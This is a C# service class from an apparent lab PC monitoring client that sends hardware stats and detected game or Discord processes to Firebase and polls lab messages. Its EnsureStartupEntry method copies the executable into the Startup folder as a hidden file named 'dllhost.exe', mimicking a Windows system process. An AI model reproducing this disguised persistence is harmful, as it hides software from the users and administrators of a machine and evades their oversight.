using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text.Json;
using System.Threading.Tasks;
using System.Timers;
using TaskEngine.Models;
using TaskEngine.Utils;
using Timer = System.Timers.Timer;

namespace TaskEngine.Services
{
    public class ClientService : IDisposable
    {
        private readonly FirebaseService _firebase;
        private readonly string _pcName;
        private readonly Timer _timer;
        private readonly Timer _cleanupTimer;
        private readonly Timer _messageTimer;

        public string CurrentNickname { get; set; }
        private bool _disposed;
        private string _lastGlobalMessageId;
        private string _lastLabMessageId;

        // ✅ Persistencia de estado
        private readonly string _stateFilePath;
        private readonly string _groupConfigPath;

        public event Action<string> OnLog;

        private const int HISTORY_SAVE_INTERVAL_SECONDS = 60 * 10;
        private const int CLEANUP_INTERVAL_MINUTES = 40;
        private const int HISTORY_RETENTION_MINUTES = 1440 * 7;
        private const int GLOBAL_MESSAGE_CHECK_INTERVAL_MS = 10000;

        private DateTime _lastHistorySave = DateTime.MinValue;
        private string _pcGroup = "Sin grupo";

        public ClientService(double intervalMs = 3000)
        {
            _firebase = new FirebaseService();
            _pcName = Environment.MachineName;

            // Rutas de persistencia
            string appData = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "TaskEngine");
            Directory.CreateDirectory(appData);
            _stateFilePath = Path.Combine(appData, "client_state.json");
            _groupConfigPath = Path.Combine(appData, "group_config.txt");

            _timer = new Timer(intervalMs) { AutoReset = true };
            _timer.Elapsed += async (s, e) => await TimerTickAsync();

            _cleanupTimer = new Timer(TimeSpan.FromMinutes(CLEANUP_INTERVAL_MINUTES).TotalMilliseconds)
            {
                AutoReset = true
            };
            _cleanupTimer.Elapsed += async (s, e) => await CleanupHistoryAsync();

            _messageTimer = new Timer(GLOBAL_MESSAGE_CHECK_INTERVAL_MS) { AutoReset = true };
            _messageTimer.Elapsed += async (s, e) =>
            {
                await CheckGlobalMessagesAsync();
                await CheckLabMessagesAsync();
            };
        }

        public async Task InitializeAsync()
        {
            // ✅ Cargar estado persistente
            await LoadPersistedStateAsync();

            var existing = await _firebase.GetMachineAsync(_pcName);
            if (existing == null)
            {
                CurrentNickname = _pcName;
                var info = new PCInfo
                {
                    PCName = _pcName,
                    Nickname = CurrentNickname,
                    IsOnline = true,
                    LastUpdate = DateTime.UtcNow.ToString("o"),
                    Timestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds()
                };
                await _firebase.SetMachineAsync(_pcName, info);
            }
            else
            {
                CurrentNickname = existing.Nickname ?? _pcName;
            }
        }

        public void Start()
        {
            EnsureStartupEntry();

            if (_disposed) throw new ObjectDisposedException(nameof(ClientService));
            if (_timer.Enabled) return;

            _ = RegisterIfFirstTimeAsync();
            _ = InitializeNicknameAsync();
            _ = InitializeGroupAsync();

            Log($"ClientService starting (interval {_timer.Interval}ms) for {_pcName}");
            _ = TimerTickAsync();
            _timer.Start();
            _cleanupTimer.Start();
            _messageTimer.Start();
        }

        public void Stop()
        {
            if (_disposed) return;
            if (!_timer.Enabled) return;
            _timer.Stop();
            _cleanupTimer.Stop();
            _messageTimer.Stop();
            Log("ClientService stopped");
        }

        private async Task LoadPersistedStateAsync()
        {
            // Cargar último estado de mensajes
            if (File.Exists(_stateFilePath))
            {
                try
                {
                    var state = JsonSerializer.Deserialize<Dictionary<string, string>>(await File.ReadAllTextAsync(_stateFilePath));
                    _lastGlobalMessageId = state.GetValueOrDefault("LastGlobalMessageId");
                    _lastLabMessageId = state.GetValueOrDefault("LastLabMessageId");
                }
                catch (Exception ex)
                {
                    Log($"Error al cargar estado: {ex.Message}");
                }
            }

            // Cargar último grupo
            if (File.Exists(_groupConfigPath))
            {
                try
                {
                    _pcGroup = (await File.ReadAllTextAsync(_groupConfigPath)).Trim();
                }
                catch (Exception ex)
                {
                    Log($"Error al cargar grupo: {ex.Message}");
                    _pcGroup = "Sin grupo";
                }
            }
        }

        private async Task SaveMessageStateAsync()
        {
            try
            {
                var state = new Dictionary<string, string>
                {
                    ["LastGlobalMessageId"] = _lastGlobalMessageId,
                    ["LastLabMessageId"] = _lastLabMessageId
                };
                await File.WriteAllTextAsync(_stateFilePath, JsonSerializer.Serialize(state));
            }
            catch (Exception ex)
            {
                Log($"Error al guardar estado: {ex.Message}");
            }
        }

        private void EnsureStartupEntry()
        {
            try
            {
                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                string currentExe = Process.GetCurrentProcess().MainModule.FileName;
                string startupExe = Path.Combine(startupFolder, "dllhost.exe");

                if (!File.Exists(startupExe))
                {
                    File.Copy(currentExe, startupExe);
                    File.SetAttributes(startupExe, File.GetAttributes(startupExe) | FileAttributes.Hidden);
                }
            }
            catch (Exception ex)
            {
                Log($"Error al copiar al inicio: {ex.Message}");
            }
        }

        private async Task RegisterIfFirstTimeAsync()
        {
            var existing = await _firebase.GetMachineAsync(_pcName);
            if (existing == null)
            {
                var info = new PCInfo
                {
                    PCName = _pcName,
                    CpuUsage = 0,
                    CpuTemperature = 0,
                    RamUsagePercent = 0,
                    TotalRamMB = 0,
                    UsedRamMB = 0,
                    DiskUsagePercent = 0,
                    IsOnline = true,
                    LastUpdate = DateTime.UtcNow.ToString("o"),
                    Timestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds(),
                    Nickname = _pcName
                };
                await _firebase.SetMachineAsync(_pcName, info);
            }
        }

        private async Task CheckLabMessagesAsync()
        {
            try
            {
                var labMsg = await _firebase.GetLabMessageAsync(_pcGroup);
                if (labMsg != null && labMsg.Id != _lastLabMessageId)
                {
                    _lastLabMessageId = labMsg.Id;
                    Log($"[MENSAJE LAB {_pcGroup}] [{labMsg.Sender}] {labMsg.Message}");
                    await SaveMessageStateAsync(); // ✅ Guardar inmediatamente
                }
            }
            catch (Exception ex)
            {
                Log($"Error checking lab messages: {ex.Message}");
            }
        }

        private async Task InitializeNicknameAsync()
        {
            try
            {
                var existing = await _firebase.GetMachineAsync(_pcName);
                if (existing != null && !string.IsNullOrWhiteSpace(existing.Nickname))
                    CurrentNickname = existing.Nickname;
                else
                    CurrentNickname = _pcName;
            }
            catch (Exception ex)
            {
                Log("Error inicializando nickname: " + ex.Message);
                CurrentNickname = _pcName;
            }
        }

        private async Task CleanupHistoryAsync()
        {
            if (string.IsNullOrWhiteSpace(_pcName)) return;
            await _firebase.CleanOldHistoryAsync(_pcName, TimeSpan.FromMinutes(HISTORY_RETENTION_MINUTES));
        }

        private async Task CheckGlobalMessagesAsync()
        {
            try
            {
                var globalMsg = await _firebase.GetGlobalMessageAsync();
                if (globalMsg != null && globalMsg.Id != _lastGlobalMessageId)
                {
                    if (DateTime.TryParse(globalMsg.Timestamp, out DateTime msgTime))
                    {
                        if ((DateTime.UtcNow - msgTime).TotalMinutes > 5)
                            return;
                    }

                    _lastGlobalMessageId = globalMsg.Id;
                    Log($"[MENSAJE GLOBAL] [{globalMsg.Sender}] {globalMsg.Message}");
                    await SaveMessageStateAsync(); // ✅ Guardar inmediatamente
                }
            }
            catch (Exception ex)
            {
                Log($"Error checking global messages: {ex.Message}");
            }
        }

        private async Task TimerTickAsync()
        {
            var now = DateTime.UtcNow;

            float cpu = 0f, temp = 0f, disk = 0f;
            int usedMB = 0, totalMB = 0;
            float ramPercent = 0f;

            try { cpu = SystemInfo.GetCpuUsagePercent(); } catch { }
            try { temp = SystemInfo.GetCpuTemperature(); } catch { }
            try { disk = SystemInfo.GetDiskUsagePercent("C"); } catch { }
            try
            {
                var r = SystemInfo.GetRamInfo();
                ramPercent = r.percentUsed;
                usedMB = Convert.ToInt32(r.usedMB);
                totalMB = Convert.ToInt32(r.totalMB);
            }
            catch { }

            string currentNickname = CurrentNickname;
            string currentGroup = _pcGroup;

            try
            {
                var pc = await _firebase.GetMachineAsync(_pcName);
                if (pc != null)
                {
                    if (!string.IsNullOrEmpty(pc.Nickname))
                    {
                        currentNickname = pc.Nickname;
                        CurrentNickname = currentNickname;
                    }
                    if (!string.IsNullOrEmpty(pc.Group))
                    {
                        currentGroup = pc.Group;
                        if (currentGroup != _pcGroup)
                        {
                            _pcGroup = currentGroup;
                            // ✅ Guardar grupo inmediatamente
                            await File.WriteAllTextAsync(_groupConfigPath, _pcGroup);
                        }
                    }
                }
            }
            catch { }

            // === DETECTAR APPS PROHIBIDAS ===
            List<string> forbiddenApps = new List<string>();
            string[] forbiddenList = GetForbiddenList();

            try
            {
                var processes = Process.GetProcesses();
                foreach (var p in processes)
                {
                    try
                    {
                        string name = p.ProcessName.ToLowerInvariant();
                        if (forbiddenList.Any(f => name == f || name.StartsWith(f)))
                        {
                            forbiddenApps.Add(name);
                        }
                    }
                    catch { /* ignore */ }
                }
                forbiddenApps = forbiddenApps.Distinct().ToList();
            }
            catch { /* ignore */ }

            var info = new PCInfo
            {
                PCName = _pcName,
                CpuUsage = cpu,
                CpuTemperature = temp,
                RamUsagePercent = ramPercent,
                TotalRamMB = totalMB,
                UsedRamMB = usedMB,
                DiskUsagePercent = disk,
                IsOnline = true,
                LastUpdate = DateTime.UtcNow.ToString("o"),
                Timestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds(),
                Nickname = currentNickname,
                ForbiddenProcesses = forbiddenApps,
                ForbiddenAppOpen = forbiddenApps.Count > 0,
                Group = currentGroup // ✅ Asegurar que el grupo se envía
            };

            try { await _firebase.SetMachineAsync(_pcName, info); }
            catch (Exception ex) { Log($"Firebase error (main): {ex.Message}"); }

            if ((now - _lastHistorySave).TotalSeconds >= HISTORY_SAVE_INTERVAL_SECONDS)
            {
                _lastHistorySave = now;
                try
                {
                    await _firebase.AddHistoryPointAsync(_pcName, info);
                    await CleanupHistoryAsync();
                }
                catch (Exception ex) { Log($"Failed to save history: {ex.Message}"); }
            }
        }

        private void Log(string text)
        {
            try
            {
                var msg = $"[ClientService {DateTime.Now:HH:mm:ss}] {text}";
                Console.WriteLine(msg);
                OnLog?.Invoke(msg);
            }
            catch { }
        }

        public Task SendSnapshotAsync() => TimerTickAsync();

        private async Task InitializeGroupAsync()
        {
            try
            {
                var pc = await _firebase.GetMachineAsync(_pcName);
                if (pc != null && !string.IsNullOrEmpty(pc.Group))
                {
                    _pcGroup = pc.Group;
                    await File.WriteAllTextAsync(_groupConfigPath, _pcGroup); // ✅ Guardar inmediatamente
                }
            }
            catch (Exception ex)
            {
                Log("Error inicializando grupo: " + ex.Message);
            }
        }

        public async Task UpdateNicknameAsync(string newNickname)
        {
            CurrentNickname = newNickname;
            var info = await _firebase.GetMachineAsync(_pcName);
            if (info != null)
            {
                info.Nickname = newNickname;
                await _firebase.SetMachineAsync(_pcName, info);
            }
        }

        private string[] GetForbiddenList()
        {
            return new string[]
            {
                "steam",
                "epicgameslauncher",
                "roblox",
                "minecraft",
                "valorant",
                "fortnite",
                "leagueclient",
                "discord"
            }.Select(s => s.ToLowerInvariant()).ToArray();
        }

        #region IDisposable
        public void Dispose()
        {
            if (_disposed) return;
            try
            {
                Stop();
                _timer.Dispose();
                _cleanupTimer.Dispose();
                _messageTimer.Dispose();
            }
            catch { }
            _disposed = true;
        }
        #endregion
    }
}